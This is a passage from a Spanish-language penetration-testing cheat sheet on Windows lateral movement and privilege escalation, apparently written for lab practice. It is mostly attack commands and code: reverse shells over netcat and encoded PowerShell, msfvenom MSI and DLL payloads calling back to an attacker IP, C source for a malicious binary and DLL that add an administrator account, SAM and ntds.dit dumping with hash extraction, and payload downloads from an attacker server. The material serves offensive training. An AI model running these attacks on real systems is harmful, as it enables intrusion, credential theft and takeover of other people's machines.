Con esta herramienta, la salida del comando se envía a un archivo, al que posteriormente se accede a través del recurso compartido `ADMIN$`. Para que esta utilidad sea efectiva, es esencial sincronizar los relojes de la computadora atacante y de la computadora objetivo al minuto exacto.

Podemos aprovechar esta herramienta insertando un reverse shell en el host de destino.

Nos ponemos en escucha con Netcat

```bash
rlwrap nc -lnvp 4444
```

Ahora pasemos el nombre de dominio, el usuario administrador, la contraseña y la dirección IP de destino. `<domain>/<user>:<password>@<ip>`y, por último, podemos pasar nuestro payload de reverse shell para que se ejecute.

```bash
impacket-atexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
```

###  9.3. <a name='winrm'></a>WinRM

[Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) es la versión de Microsoft del [protocolo WS-Management (Web Services-Management)](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) , un protocolo estándar para administrar software y hardware de forma remota. WinRM facilita la transferencia de datos de administración entre computadoras, lo que permite a los administradores realizar una variedad de tareas, como ejecutar scripts y recuperar datos de eventos de sistemas remotos.

WinRM se usa comúnmente junto con PowerShell con fines administrativos y de automatización, lo que lo convierte en una herramienta indispensable para administrar entornos Windows. Proporciona un método seguro y eficiente para interactuar con sistemas remotos, aprovechando los estándares web establecidos para garantizar la compatibilidad y la flexibilidad. La comunicación WinRM utiliza principalmente el puerto TCP `5985` para HTTP y `5986` para HTTPS.

```bash
netexec winrm 192.168.56.10 -u <user> -p <password>
```
####  9.3.1. <a name='invoke-command'></a>Invoke-Command
Podemos usar PowerShell para interactuar con WinRM en Windows, PowerShell tiene cmdlets como [Invoke-Command](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4) y [Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4) para administrar y ejecutar comandos en sistemas remotos.

```powershell
 Invoke-Command -ComputerName MS02 -ScriptBlock { hostname;whoami }
```

Además, podemos especificar credenciales con el parámetro `-Credential`:

```powershell
PS C:\Tools> $username = "HACKLAB.LOCAL\elliot"
PS C:\Tools> $password = "Password123"
PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Tools> Invoke-Command -ComputerName 192.168.56.10 -Credential $credential -ScriptBlock { whoami; hostname }
hacklab.local\elliot
DC01
```

> Si usamos la IP en lugar del nombre de la computadora, debemos usar credenciales explícitas o, alternativamente, podemos usar la bandera `-Authentication Negotiate` en lugar de proporcionar credenciales explícitas.

####  9.3.2. <a name='winrs'></a>WINRS

[winrs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell) es una herramienta de línea de comandos que permite ejecutar comandos en una máquina con Windows utilizando WinRM de forma remota. A continuación se muestra un ejemplo de cómo utilizar `winrs` para ejecutar un comando en un servidor remoto:

```powershell-session
PS C:\Tools> winrs -r:MS02 "powershell -c whoami;hostname"
hacklab.local\elliot
DC01
```

`winrs` también nos permite usar credenciales explícitas con las opciones `/username:<username>` y `/password:<password>` así:

```powershell
PS C:\Tools> winrs /remote:MS02 /username:elliot /password:Password123 "powershell -c whoami;hostname"
hacklab.local\elliot
DC01
```

####  9.3.3. <a name='enter-pssession'></a>Enter-PSSession

Podemos usar el Cmdlet `Enter-PSSession` para un shell interactivo usando PowerShell Remoting. Este cmdlet nos permite iniciar una sesión interactiva con la computadora remota, ya sea utilizando una sesión creada con `New-PSSession`, especificando credenciales explícitas, o aprovechando la sesión actual donde se ejecuta el comando. Por ejemplo, reutilicemos el `$sessionMS02` variable que creamos anteriormente. Especificando el `Enter-PSSession` y la variable nos dará un mensaje interactivo de PowerShell en la computadora remota, lo que nos permite ejecutar comandos como si nos registraran directamente.

```powershell
PS C:\Temp> $username = "HACKLAB.LOCAL\elliot"
PS C:\Temp> $password = "Password123"
PS C:\Temp> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Temp> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Temp> $sessionMS02 = New-PSSession -ComputerName MS02 -Credential $credential
PS C:\Temp> Enter-PSSession $sessionMS02
[MS02]: PS C:\Users\elliot\Documents>
```

####  9.3.4. <a name='netexec-4'></a>NetExec

Con `NetExec` podemos usar la opción `-x` para ejecutar comandos CMD o PowerShell. Por ejemplo, para ejecutar un comando básico como `ipconfig` podemos usar el siguiente comando:

```shell
netexec winrm 192.168.56.10 -u elliot -p Password123 -x "ipconfig"
```

####  9.3.5. <a name='evil-winrm'></a>Evil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) es una herramienta basada en Ruby que facilita la interacción con WinRM desde Linux. Ofrece una interfaz sencilla para ejecutar comandos y administrar sistemas Windows de forma remota.

Una vez instalado, podemos usar `evil-winrm` para conectarse a una máquina Windows remota y ejecutar comandos. Debemos especificar la opción. `-i <target>` y las credenciales con las opciones `-u '<domain>\<user>'` para usuarios y para contraseña `-p <password>`:

```bash
evil-winrm -i 192.168.56.10 -u elliot -p Password123
```

##  10. <a name='escalación-de-privilegios'></a>Escalación de Privilegios

###  10.1. <a name='windows-2'></a>Windows

####  10.1.1. <a name='enumeración-1'></a>Enumeración

##### Sistema

```powershell
hostname

# Devuelve True si un equipo forma parte de un dominio
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

qwinsta

query user

systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
[System.Environment]::OSVersion.Version
Get-ComputerInfo
Get-ComputerInfo | Select OsName,OsVersion,OsType

# variable de entorno
echo %PATH%
set
Get-ChildItem Env: | ft Key,Value

# Parches
wmic qfe get Caption, Description, HotFixID, InstalledOn
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

# Actualizaciones del sistema
wmic qfe list brief

# Lista los procesos en ejecución
tasklist /svc

# Lista los procesos en ejecución
Get-Process
Get-Process | Select-Object Name, Path
Get-WmiObject Win32_Process -Filter "name = 'notepad.exe'" | Select-Object Name, ExecutablePath

# Listar procesos NO estandar, procesos que no están en las carpetas del sistema
Get-Process | Where-Object { $_.Path -notmatch "C:\\Windows\\System32" -and $_.Path -notmatch "C:\\Windows\\SysWOW64" } | Select-Object ProcessName, Id, Path

# Parches
Get-HotFix | ft -AutoSize

# Programas instalados
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-WmiObject -Class Win32_Product |  select Name, Version
wmic product get name

# Lista los modulos
Get-Module

Get-ExecutionPolicy -List

# Listar las reglas de AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Probar la política de AppLocker
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

# Obtener el historial de PowerShell del usuario especificado
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Confirmar si UAC esta habilitado
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Comprobar el nivel de UAC
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

##### Usuarios

```powershell
whoami all
whoami /priv
whoami /groups

net users
net user <USER>
net user <USER> /domain
net user %username%
Get-LocalUser

# Información acerca del requerimiento de contraseña
net accounts
net accounts /domain

# Crear usuario
net user /add <USERNAME> <PASSWORD>

echo "%USERDOMAIN%"
echo %logonserver%
wmic USERACCOUNT Get Domain,Name,Sid
```

##### Grupos

```powershell
# Local
net localgroup # Lista todos los grupos
net localgroup Administrators # Info acerca de un grupo (admins)
net localgroup administrators <USERNAME> /add # Agreaga un usuario al grupo administrators

Get-LocalGroup # Lista todos los grupos locales
Get-LocalGroupMember <GROUP> # Lista los miembros de un Grupo

# Dominio
net group /domain                      # Info acerca de los grupos del dominio
net group /domain <DOMAIN_GROUP_NAME>  # Usuarios que pertencen al grupo
net group "Domain Computers" /domain   # Lista de PC conectadas al dominio
net group "Domain Controllers" /domain # Listar cuentas de PC de controladores de dominio
```
##### Red

```powershell
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh advfirewall show state
```
##### Windows Defender

```powershell
netsh advfirewall show allprofiles
sc query windefend

Get-MpComputerStatus
```
##### Recursos compartidos

Recursos compartidos comunes en Windows:

- `C$` corresponde a C:/
- `ADMIN$` se asigna a C:/Windows
- `IPC$` se utiliza para RPC
- `Print$` aloja controladores para impresoras compartidas
- `SYSVOL` sólo en DCs
- `NETLOGON` sólo en los DC

```powershell
# Listar recursos compartidos
Get-SMBShare
net share

# Montar el recurso compartido
net use z: \\172.16.0.1\C$ /user:elliot "P@ssword123!"

# Desmontar el recurso compartido
net use /delete z:

# /all nos permite ver los recursos compartidos administrativos (que terminan en '$').
# Puede usarse IP o nombre de host para especificar el host.
net view \\172.16.0.1 /all
```
##### Información sensible

Buscamos información sensible.

```powershell
Get-ChildItem -Force
ls -Force

where /R C:\ bash.exe # Realiza una búsqueda del archivo (en este caso del binario bash.exe) en el sistema

Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\elliot\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Select-String -Path C:\Users\elliot\Documents\*.txt -Pattern password

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /S /I /C:"password" "C:\Users\*"*.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*

# Visualización de redes inalámbricas guardadas
netsh wlan show profile
```

Buscar contraseñas en el Registro

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

##### Volcado de credenciales

```powershell
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\system c:\temp\system.save
reg.exe save hklm\security c:\temp\security.save
```

Algunos otros archivos en los que podemos encontrar credenciales incluyen lo siguiente:

```powershell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, 
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
##### Credenciales guardadas

El [comando CMDKey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) se puede usar para crear, enumerar y eliminar los nombres de usuario y contraseñas almacenados. Los usuarios pueden desear almacenar credenciales para un host específico o usarlo para almacenar credenciales para conexiones de servicios de terminal para conectarse a un host remoto que usa escritorio remoto sin necesidad de ingresar una contraseña. Esto puede ayudarnos a movernos lateralmente a otro sistema con un usuario diferente o aumentar los privilegios en el host actual para aprovechar las credenciales almacenadas para otro usuario.

```powershell
cmdkey /list
```

```powershell-session
runas /savecred /user:hacklab.local\bob "whoami"
```
##### Windows Autologon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) es una característica que permite a un usuario configurar su sistema operativo Windows para iniciar sesión automáticamente en una cuenta de usuario específica, sin requerir la entrada manual del nombre de usuario y la contraseña en cada inicio. Sin embargo, una vez que esto se configura, el nombre de usuario y la contraseña se almacenan en el registro, en texto claro. Esta característica se usa comúnmente en sistemas de un solo usuario o en situaciones donde la conveniencia supera la necesidad de una mayor seguridad.

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

##### Enumeración automatizada

- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [LaZagne](https://github.com/AlessandroZ/LaZagne)
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)

####  10.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios

##### AlwaysInstallElevated

La política **Always Install Elevated** es una configuración en Windows que permite a los usuarios estándar instalar aplicaciones con privilegios elevados. Cuando esta política está habilitada, cualquier instalación de aplicación iniciada por un usuario estándar se ejecuta con derechos administrativos, evitando así las solicitudes de **Control de Cuentas de Usuario (UAC)**.

###### Comprobar que la política AlwaysInstallElevated esta habilitada

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
```

###### Cómo funciona

Cuando la configuración **Always Install Elevated** está habilitada, ocurre lo siguiente:

1. **Elevación de Instalaciones**:
    - Los usuarios estándar pueden instalar aplicaciones sin necesidad de proporcionar credenciales de administrador. Esto permite que los paquetes MSI se ejecuten automáticamente con permisos administrativos.
2. **Bypass de UAC**:
    - El sistema no muestra el aviso de UAC, lo que reduce la visibilidad para el usuario y puede facilitar la instalación de software no autorizado o malicioso.

###### Explotación de Always Install Elevated: Creación y Ejecución de un MSI Malicioso

###### 1. Generar un Paquete MSI Malicioso

Para aprovechar esta política, podemos crear un paquete MSI malicioso para obtener una reverse shell hacia nuetro equipo de atacante. Esto se puede hacer utilizando `msfvenom`. En este ejemplo, configuramos el host local `LHOST` como `192.168.56.5` y el puerto local `LPORT` como `4444`.

El comando para generar el paquete MSI es:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f msi > shell.msi
```

###### 2. Transferir el Archivo MSI al Objetivo

Una vez generado el archivo `shell.msi`, debemos transferirlo a la máquina objetivo. Podemos usar algunos métodos como:

- Compartir archivos (por ejemplo, a través de SMB).
- Subirlo a un servidor web y descargarlo en la máquina objetivo.
- Copiarlo directamente si tienes acceso físico o remoto.

###### 3. Configurar un Listener

El la máquina atacante nos ponemos en escucha con netcat por el puerto indicado, en este caso `4444`.

```bash
rlwrap nc -lnvp 4444
```

###### 4. Ejecutar el Paquete MSI en el Objetivo

En la máquina objetivo, ejecutamos el paquete MSI utilizando el comando `msiexec`. Para evitar alertas o interrupciones, usamos los parámetros `/quiet` y `/qn`, que ejecutan la instalación en modo silencioso:

```powershell
msiexec /i C:\temp\shell.msi /quiet /qn /norestart
```

##### BackupOperators - SeBackupPrivilege y SeRestorePrivilege

El grupo **BackupOperators** es un grupo integrado en Windows que otorga a sus miembros la capacidad de realizar copias de seguridad y restaurar archivos, incluso si no tienen permisos para acceder a esos archivos en circunstancias normales. Este privilegio hace que el grupo sea especialmente poderoso y potencialmente peligroso en escenarios de *escalación de privilegios*, ya que los miembros pueden acceder a archivos sensibles, como la base de datos **SAM (Security Account Manager)** y archivos del sistema, lo que podría permitirles obtener acceso de mayor nivel o incluso privilegios de *SYSTEM*.

###### Privilegios Clave del grupo Backup Operators

Los miembros del grupo **Backup Operators** tienen dos privilegios principales:

1. **SeBackupPrivilege**:
    - Permite a los usuarios **omitir los permisos del sistema de archivos** para realizar copias de seguridad. Esto significa que un miembro de este grupo puede leer archivos a los que normalmente no tendría acceso.
    - **Ejemplo de uso**: Acceder a archivos protegidos como el archivo **SAM**, que almacena los hashes de las contraseñas de los usuarios locales.

2. **SeRestorePrivilege**:
    - Permite a los usuarios **restaurar archivos en cualquier ubicación** del sistema de archivos, incluyendo ubicaciones protegidas o sensibles. Esto también les permite modificar archivos que normalmente estarían restringidos.
    - **Ejemplo de uso**: Sobrescribir archivos del sistema, como binarios de servicios, para ejecutar código malicioso con privilegios elevados.

###### Explotación

Extraer el archivo **SAM**:

Usar herramientas como `reg.exe` para exportar el archivo SAM y SYSTEM:

```powershell
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

Extraer los hashes de contraseñas.

###### mimikatz

Desde Windows podemos usar mimikatz

```powershell
sekurlsa::samdump::local c:\temp\sam c:\temp\system
```

También podemos transferir los archivos a nuestra máquina atacante y usar `secretsdump.py` o `pypykatz`.

###### secretsdump.py

```bash
impacket-secrestsdump -sam sam -system system local
```

###### pypykatz

```bash
pypykatz registry --sam sam system
```

##### Extracción del archivo ntds.dit en un Controlador de Dominio

A diferencia de la explotación en sistemas independientes, en un Controlador de Dominio (DC), necesitamos acceder al archivo **ntds.dit** para extraer los hashes de contraseñas, junto con el archivo SYSTEM. Sin embargo, el archivo **ntds.dit** presenta un desafío importante: mientras el Controlador de Dominio está en funcionamiento, este archivo está siempre en uso, lo que impide su copia directa mediante métodos convencionales.

Para superar este problema, podemos utilizar la herramienta `diskshadow`, una funcionalidad integrada de Windows que nos permite crear una copia en la sombra (shadow copy) de una unidad, incluso si está en uso. Aunque diskshadow puede ejecutarse directamente desde una shell, este enfoque suele ser complicado y propenso a errores. Por ello, optamos por crear un Archivo Shell Distribuido (DSH), que contiene todos los comandos necesarios para que diskshadow realice la copia de la unidad de manera automatizada.

###### 1. Crear el Archivo DSH

En nuestra máquina de atacante, creamos un archivo DSH utilizando un editor de texto. Este archivo contendrá los comandos necesarios para que diskshadow cree una copia de la unidad C: en una unidad virtual Z:. Aquí está el contenido del archivo DSH:

```bash
> vim cmd
set context persistent nowriters
add volume c: alias cmd
create
expose %cmd% z:
> unix2dos cmd.dsh
```

- `set context persistent nowriters`: Configura el contexto para crear una copia en la sombra persistente y sin escritura.
- `add volume c: alias backup`: Agrega la unidad C: como un volumen para la copia, asignándole el alias backup.
- `create`: Crea la copia en la sombra.
- `expose %backup% z:`: Expone la copia en la sombra como una nueva unidad `Z:`.

###### 2. Convertir el Archivo DSH a Formato Windows

Dado que el archivo DSH se crea en un entorno Linux, debemos asegurarnos de que sea compatible con Windows. Para ello, usamos la herramienta `unix2dos`, que convierte la codificación y el espaciado del archivo a un formato compatible con Windows:

```bash
unix2dos cmd.dsh
```

Esto asegura que los saltos de línea y la codificación sean correctos para su ejecución en Windows.

###### 3. Transferir el Archivo DSH al Controlador de Dominio:

Una vez convertido, transferimos el archivo DSH al Controlador de Dominio utilizando métodos como SMB, FTP o cualquier otro medio disponible.

###### 4. Ejecutar diskshadow con el Archivo DSH y Extraer el Archivo ntds.dit

Una vez conectados en la máquina objetivo, nos movemos al Directorio Temp y subimos el archivo `archivo.dsh`. Luego, usamos el script diskshadow con dsh como se muestra abajo. Si se observa, se puede notar que diskshadow está efectivamente ejecutando los mismos comandos que ingresamos en el archivo dsh secuencialmente. Después de ejecutarse, como se ha comentado, creará una copia de la unidad C en la unidad Z. Ahora, podemos utilizar la herramienta RoboCopy para copiar el archivo de la unidad Z al directorio temporal.

```powershell
cd C:\Temp
upload archivo.dsh
cmd.exe /c "diskshadow /s archivo.dsh"
robocopy /b z:\windows\ntds . ntds.dit
```

```powershell
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

###### 5. Extraer los hashes

Transferimos los archivos a nuestra máquina atacante y extraemos los hashes.

```bash
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

##### Aprovechar los servicios de Windows

###### Enumeración de servicios en ejecución

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- `Get-CimInstance`: Es un cmdlet de PowerShell que se utiliza para obtener instancias de clases CIM (Common Information Model) o WMI (Windows Management Instrumentation).

- `-ClassName win32_service`: Especifica la clase WMI que se va a consultar. En este caso, win32_service es una clase que contiene información sobre los servicios de Windows.

###### Enumeración de la configuración del servicio

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
```

###### Mascara de Permisos `icacls`

| Mask | Permissions |
| --- | --- |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

###### Enumeración de Permisos

```powershell
icacls "C:\Ruta\al\binario\<binario>"
```

###### adduser.c

En nuestra máquina atacante, creamos un binario malicioso el cual crea un nuevo usuario y lo agrega al grupo de administradores.

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user elliot Password123! /add");
  i = system ("net localgroup administrators elliot /add");
  
  return 0;
}
```

###### Compilamos el código

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
###### Transferimos el binario a la máquina víctima.

```powershell
iwr -uri http://192.168.56.5/adduser.exe -Outfile adduser.exe
```

###### Movemos el binario a la ruta correspondiente

```powershell
move .\adduser.exe "C:\Ruta\al\binario\<binario>"
```

###### Ejecución

```powershell
net stop <SERVICE>
net start <SERVICE>
```

Alernativamente si no tenemos privilegios para reiniciar el servicio, podemos comprobar si el servicio se inicia al iniciar el sistema y si tenemos la capacidad para reiniciar la máquina.

```powershell
whoami /priv
```

Deberíamos ver el privilegio `SeShutdownPrivilege`

Por ultimo ejecutamos:

```powershell
shutdown /r /t 0
```

###### PowerUp

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```

###### Enumeración de propiedades de ejecución del servicio

```powershell
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```
##### DLL Hijacking

###### Orden de búsqueda estándar

El orden de búsqueda lo define Microsoft y determina que inspeccionar primero al buscar una DLL. De forma predeterminada, todos las versiones actuales de Windows tienen habilitada el modo de busqueda segurda de DLL.

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema.
3. El directorio del sistema de 16 bits.
4. El directorio de Windows.
5. El directorio actual.
6. Los directorios que aparecen enumerados en la variable de entorno PATH.

###### evildll.cpp
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Manejar el módulo DLL
DWORD ul_reason_for_call,// Motivo de la llamada a la función
LPVOID lpReserved ) // Reservado
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // Un proceso está cargando la DLL.
        int i;
        i = system ("net user <USERNAME> <PASSWORD> /add");
        i = system ("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH: // Un proceso está creando un nuevo hilo.
        break;
        case DLL_THREAD_DETACH: // Un hilo termina normalmente.
        break;
        case DLL_PROCESS_DETACH: // Un proceso descarga la DLL.
        break;
    }
    return TRUE;
}
```

###### Compilar el archivo evildll.dll

```bash
x86_64-w64-mingw32-gcc evildll.cpp --shared -o evildll.dll
```

###### Alternativa - Usar msfvenom para crear una DLL y recibir una reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evildll.dll
```

###### Transferimos la DLL a la máquina objetivo

```powershell
iwr -uri http://192.168.56.5/evildll.dll -OutFile 'C:\Ruta\Al\Binario\<FILE>.dll'
```

> Tener en cuenta, que si ejecutamos el binario con los privilegios de un usuario normal, el binario será ejecutado con esos privilegios y no es lo que queremos. Con esto en mente, no tenemos que iniciar la aplicación por nuestra cuenta. Deberemos esperar a que alguien con mayores privilegios la ejecute y active la carga de nuestra DLL maliciosa.

##### Rutas de servicio sin comillas (Unquoted Service Paths)

###### Orden de búsqueda

```powershell
C:\example.exe
C:\Program Files\example.exe
C:\Program Files\my example\example.exe
C:\Program Files\my example\my example\example.exe
```

###### Enumeración de rutas de servicio

```powershell
# Buscamos servicios que cumplan con esta condición
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Comprobar si podemos iniciar/detener el servicio
Start-Service <SERVICE>
Stop-Service <SERVICE>

# Buscar en la ruta donde se encuentra el servicio, directorios en los cuales podemos escribir para poder agregar nuestro binario malicioso 
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\my example"

# Iniciamos el servicio
Start-Service <SERVICE>

# Otra forma de buscar binarios que cumplan con esta condición es
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

###### Alternativa - PowerUp

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my binary\binary.exe"
Start-Service <SERVICE>
```

##### Tareas Programadas (Scheduled Tasks)

> Las **Scheduled Tasks** (Tareas Programadas) en Windows son una función del sistema operativo que permite automatizar la ejecución de programas, scripts o comandos en momentos específicos o bajo ciertas condiciones. Estas tareas se pueden configurar para que se ejecuten diariamente, semanalmente, mensualmente, al iniciar el sistema, al iniciar sesión, o incluso cuando ocurren eventos específicos. Son útiles para realizar mantenimiento automático, backups, actualizaciones, o cualquier tarea repetitiva sin necesidad de intervención manual.

```powershell
# Listar las tareas programadas
schtasks /query /fo LIST /v
Get-ScheduleTask
Get-ScheduledTask | Where-Object { $_.Author -and $_.Author -notmatch 'Microsoft|SYSTEM|S-1-5-18|S-1-5-19|S-1-5-20' } | Select-Object TaskName, Author, @{Name='TaskToRun'; Expression={$_.Actions.Execute}}, NextRunTime
```

Cuando listamos las tareas programadas deberíamos buscar información interesante, como el autor, el nombre de la tarea, la tarea a ejecutar, el usuario que ejecuta la tarea y la próxima ejecución de la tarea.

Buscamos la ruta de la tarea a ejecutar y comprobamos si tenemos permisos de escritura en esa ruta, para poder remplazar el binario.

```powershell
icacls C:\Ruta\Al\Binario\<BINARY>.exe
```

Reutilizamos el binario `adduser.exe` el cual crea y agrega un nuevo usuario al grupo administrador (esto depende del usuario que este ejecutando la tarea) o también podemos lanzarnos una reverse shell.

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user elliot Password123! /add");
  i = system ("net localgroup administrators elliot /add");
  
  return 0;
}
```

Creamos un servidor HTTP con Python y transferimos el binario a la máquina víctima.

```powershell
iwr -uri http://192.168.56.5/adduser.exe -Outfile <BINARY>.exe
```

Movemos el binario a la ruta del binario original para remplazarlo.

```powershell
move .\<BINARY>.exe C:\Ruta\Al\Binario\
```

##### SeImpersonate y SeAssignPrimaryToken

En Windows, cada proceso tiene asociado un **token** que contiene información sobre la cuenta que lo está ejecutando, como los permisos y privilegios asociados. Sin embargo, estos tokens **no se consideran recursos completamente seguros**, ya que residen en la memoria del sistema y, en teoría, podrían ser vulnerables a ataques de fuerza bruta o manipulación por parte de usuarios malintencionados con acceso limitado. Para utilizar un token y realizar acciones en nombre de otro usuario (por ejemplo, mediante la función `CreateProcessWithTokenW`), se requiere el privilegio **SeImpersonate**. Este privilegio está generalmente reservado para cuentas administrativas y servicios de alto nivel, como los que se ejecutan bajo las cuentas `SYSTEM` o `Local Service`.

Durante el proceso de **endurecimiento del sistema** (hardening), este privilegio puede ser eliminado o restringido como medida de seguridad.

> En Windows, cada proceso tiene un token que contiene información sobre la cuenta que lo está ejecutando. 

Los programas legítimos en Windows pueden utilizar el token de otro proceso para escalar privilegios, pasando de una cuenta de Administrador a Local System, que tiene permisos más amplios y acceso completo al sistema. Esto se logra típicamente mediante una llamada al proceso WinLogon, que es responsable de gestionar los inicios de sesión y los tokens de seguridad. Al interactuar con WinLogon, un proceso puede obtener un token del sistema y luego ejecutarse con ese token, efectivamente operando dentro del contexto de Local System.

Sin embargo, este mecanismo también puede ser explotado por atacantes en técnicas de escalada de privilegios, como los ataques del estilo "Potato". Estos ataques aprovechan el privilegio SeImpersonate, que permite a un proceso suplantar el token de otro usuario. Aunque una cuenta de servicio puede tener el privilegio SeImpersonate, no tiene acceso completo a los privilegios de nivel SYSTEM. El ataque Potato engaña a un proceso que se ejecuta como SYSTEM para que se conecte a un proceso controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token del proceso SYSTEM y utilizarlo para ejecutar código con privilegios elevados.

Varias herramientas y técnicas aprovechan SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege para escalar privilegios a SYSTEM o Administrador. A continuación, se presentan algunas de ellas:

###### JuicyPotato.exe

> *Windows 10 compilación 1809 - Windows Server 2016*

> https://github.com/ohpe/juicy-potato

JuicyPotato es una herramienta de explotación diseñada para abusar de los privilegios SeImpersonate o SeAssignPrimaryToken en sistemas Windows. Estos privilegios, comúnmente asignados a cuentas de servicio, permiten a un proceso suplantar tokens de seguridad de otros usuarios. JuicyPotato aprovecha esta capacidad mediante ataques de reflexión DCOM/NTLM, engañando a un proceso que se ejecuta con privilegios de SYSTEM para que se conecte a un servicio controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token de SYSTEM y utilizarlo para ejecutar código con privilegios elevados.

